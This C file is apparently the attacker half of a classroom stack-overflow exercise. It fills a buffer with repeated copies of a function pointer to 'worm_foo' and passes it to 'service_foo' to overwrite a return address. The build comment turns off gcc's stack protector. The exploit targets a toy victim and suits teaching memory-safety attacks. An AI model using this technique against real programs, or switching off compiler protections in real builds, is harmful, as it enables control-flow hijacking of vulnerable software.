#include <string.h>
#include <stdlib.h>

extern void service_foo(char *param, long param_length);
extern void worm_foo();

char *value_to_array(long value);

enum Constants
{
  QUAD_WORDS_NUM = 6,
  QUAD_WORD_SIZE = 8 // 8 bytes
};

int main()
{
  long arg_length = QUAD_WORDS_NUM * QUAD_WORD_SIZE;
  char *arg = (char *)calloc(arg_length, sizeof(char));

  char *worm_foo_address_array = value_to_array((long)&worm_foo);
  for (int i = 0; i < QUAD_WORDS_NUM; i++)
  {
    memcpy(arg + i * QUAD_WORD_SIZE, worm_foo_address_array, QUAD_WORD_SIZE);
  }
  free(worm_foo_address_array);

  service_foo(arg, arg_length);

  return 0;
}

// create little endian array representation of given 8 byte value
// 0x7766554433221100 ---> [0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77]
char *value_to_array(long value)
{
  char *array = (char *)calloc(QUAD_WORD_SIZE, sizeof(char));
  for (int i = 0; i < QUAD_WORD_SIZE; i++)
  {
    char temp = value & 0xFF;
    memcpy(array + i, &temp, 1);
    value >>= 8; // shift 8 bits (single byte)
  }
  return array;
}


// gcc -o exec victim.c attacker.c -fno-stack-protector